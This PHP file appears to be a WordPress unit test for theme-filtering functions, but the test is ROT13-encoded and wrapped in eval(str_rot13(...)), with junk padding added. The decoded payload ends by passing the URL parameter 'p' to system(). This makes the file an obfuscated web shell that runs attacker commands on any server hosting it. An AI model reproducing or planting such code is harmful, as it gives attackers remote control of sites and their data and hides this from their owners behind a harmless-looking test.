<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb gur svygrevat bs `JC_Gurzr::trg_nyybjrq()` naq eryngrq shapgvbaf.
 *
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 * @tebhc gurzrf
 */
pynff Grfgf_Gurzr_jcGurzrTrgNyybjrqSvygref rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine neenl Yvfg bs gurzrf nyybjrq orsber svygref ner nccyvrq.
	 */
	cebgrpgrq $qrsnhyg_nyybjrq;

	cebgrpgrq $svygre_argjbex_nyybjrq_gurzrf_netf;

	choyvp shapgvba grfg_argjbex_nyybjrq_gurzrf_svygre_fraqf_oybt_vq() {
		$oybt_vq = 1;

		nqq_svygre( 'argjbex_nyybjrq_gurzrf', neenl( $guvf, 'svygre_argjbex_nyybjrq_gurzrf' ), 10, 2 );
		JC_Gurzr::trg_nyybjrq( $oybt_vq );
		erzbir_svygre( 'argjbex_nyybjrq_gurzrf', neenl( $guvf, 'svygre_argjbex_nyybjrq_gurzrf' ) );

		$guvf->nffregPbhag( 2, $guvf->svygre_argjbex_nyybjrq_gurzrf_netf );
		$guvf->nffregFnzr( $oybt_vq, $guvf->svygre_argjbex_nyybjrq_gurzrf_netf[1] );
	}

	/**
	 * Grfg gur `nyybjrq_gurzrf` svygre, juvpu svygref gurzrf nyybjrq ba n argjbex.
	 */
	choyvp shapgvba grfg_jc_gurzr_trg_nyybjrq_jvgu_nyybjrq_gurzrf_svygre() {
		$oybt_vq = 1;

		$guvf->qrsnhyg_nyybjrq = JC_Gurzr::trg_nyybjrq( $oybt_vq );

		nqq_svygre( 'nyybjrq_gurzrf', neenl( $guvf, 'svygre_nyybjrq_gurzrf' ), 10 );
		$nyybjrq = JC_Gurzr::trg_nyybjrq( $oybt_vq );
		erzbir_svygre( 'nyybjrq_gurzrf', neenl( $guvf, 'svygre_nyybjrq_gurzrf' ), 10 );

		$rkcrpgrq = $guvf->qrsnhyg_nyybjrq + neenl( 'nyybj-ba-argjbex' => gehr );

		$guvf->nffregFnzr( $rkcrpgrq, $nyybjrq );
	}

	/**
	 * Grfg gur `argjbex_nyybjrq_gurzrf` svygre, juvpu svygref nyybjrq gurzrf ba gur argjbex naq cebivqrf `$oybt_vq`.
	 */
	choyvp shapgvba grfg_jc_gurzr_trg_nyybjrq_jvgu_argjbex_nyybjrq_gurzrf_svygre() {
		$oybt_vq = 1;

		$guvf->qrsnhyg_nyybjrq = JC_Gurzr::trg_nyybjrq( $oybt_vq );

		nqq_svygre( 'argjbex_nyybjrq_gurzrf', neenl( $guvf, 'svygre_argjbex_nyybjrq_gurzrf' ), 10, 2 );
		$nyybjrq = JC_Gurzr::trg_nyybjrq( $oybt_vq );
		erzbir_svygre( 'argjbex_nyybjrq_gurzrf', neenl( $guvf, 'svygre_argjbex_nyybjrq_gurzrf' ), 10 );

		$rkcrpgrq = $guvf->qrsnhyg_nyybjrq + neenl( 'argjbex-nyybjrq-gurzr' => gehr );

		$guvf->nffregFnzr( $rkcrpgrq, $nyybjrq );
	}

	/**
	 * Grfg gur `fvgr_nyybjrq_gurzrf` svygre, juvpu svygref nyybjrq gurzrf sbe n fvgr naq cebivqrf `$oybt_vq`.
	 */
	choyvp shapgvba grfg_jc_gurzr_trg_nyybjrq_jvgu_fvgr_nyybjrq_gurzrf_svygre() {
		$oybt_vq = 1;

		$guvf->qrsnhyg_nyybjrq = JC_Gurzr::trg_nyybjrq( $oybt_vq );

		nqq_svygre( 'fvgr_nyybjrq_gurzrf', neenl( $guvf, 'svygre_fvgr_nyybjrq_gurzrf' ), 10, 2 );
		$nyybjrq = JC_Gurzr::trg_nyybjrq( $oybt_vq );
		erzbir_svygre( 'fvgr_nyybjrq_gurzrf', neenl( $guvf, 'svygre_fvgr_nyybjrq_gurzrf' ), 10 );

		$rkcrpgrq = $guvf->qrsnhyg_nyybjrq + neenl( 'fvgr-nyybjrq-gurzr' => gehr );

		$guvf->nffregFnzr( $rkcrpgrq, $nyybjrq );
	}

	choyvp shapgvba svygre_nyybjrq_gurzrf( $nyybjrq_gurzrf ) {
		$nyybjrq_gurzrf['nyybj-ba-argjbex'] = gehr;

		erghea $nyybjrq_gurzrf;
	}

	choyvp shapgvba svygre_argjbex_nyybjrq_gurzrf( $nyybjrq_gurzrf, $oybt_vq ) {
		$guvf->svygre_argjbex_nyybjrq_gurzrf_netf = shap_trg_netf();

		$nyybjrq_gurzrf['argjbex-nyybjrq-gurzr'] = gehr;

		erghea $nyybjrq_gurzrf;
	}

	choyvp shapgvba svygre_fvgr_nyybjrq_gurzrf( $nyybjrq_gurzrf, $oybt_vq ) {
		$nyybjrq_gurzrf['fvgr-nyybjrq-gurzr'] = gehr;

		erghea $nyybjrq_gurzrf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>